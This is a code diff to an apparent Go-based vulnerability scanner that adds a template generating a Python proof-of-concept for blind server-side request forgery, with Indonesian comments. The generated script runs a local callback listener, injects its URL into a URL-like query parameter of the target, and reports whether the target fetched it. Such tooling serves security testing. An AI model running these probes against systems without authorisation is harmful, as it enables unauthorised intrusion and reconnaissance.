@@ -182,6 +182,55 @@ if __name__ == "__main__":
     raise SystemExit(main())
 `, targetURL, targetURL), true
 
+	case "ssrf-blind":
+		return fmt.Sprintf(`#!/usr/bin/env python3
+"""
+PoC - SSRF Blind via callback OOB (dihasilkan xyland)
+Menjalankan listener lokal lalu meminta target mengambil URL unik kita.
+CATATAN: target harus bisa menjangkau listener ini (lab/LAN sama, atau
+pakai host publik Anda dan sesuaikan CALLBACK_BASE).
+Target : %s
+Exit   : 0=callback diterima (confirmed) | 2=tidak ada callback | 3=inconclusive
+"""
+import threading, urllib.request, urllib.parse, http.server, secrets
+
+URL = %q
+CALLBACK_BASE = "http://127.0.0.1:8899"
+TOKEN = "xy" + secrets.token_hex(6)
+hits = []
+
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        if TOKEN in self.path: hits.append(self.path)
+        self.send_response(200); self.end_headers()
+    def log_message(self, *a): pass
+
+def withu(u):
+    p = urllib.parse.urlparse(u); q = urllib.parse.parse_qs(p.query)
+    KEYS = ("url","uri","link","callback","webhook","fetch","image","img","src","endpoint","proxy","load","resource")
+    pick = next((k for k in q if k.lower() in KEYS), next(iter(q), None))
+    if pick is None: return u
+    q[pick] = [CALLBACK_BASE + "/" + TOKEN]
+    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(q, doseq=True)))
+
+def main():
+    srv = http.server.HTTPServer(("127.0.0.1", 8899), H)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    try:
+        req = urllib.request.Request(withu(URL), headers={"User-Agent": "xyland-poc"})
+        urllib.request.urlopen(req, timeout=10).read()
+    except Exception:
+        pass
+    import time; time.sleep(3)
+    srv.shutdown()
+    if hits:
+        print("VERDICT: CONFIRMED (callback diterima:", hits[0], ")"); return 0
+    print("VERDICT: NO_CALLBACK (bisa FP, atau target tidak bisa menjangkau listener)"); return 2
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+`, targetURL, targetURL), true
+
 	case "sqli":
 		return fmt.Sprintf(`#!/usr/bin/env python3
 """
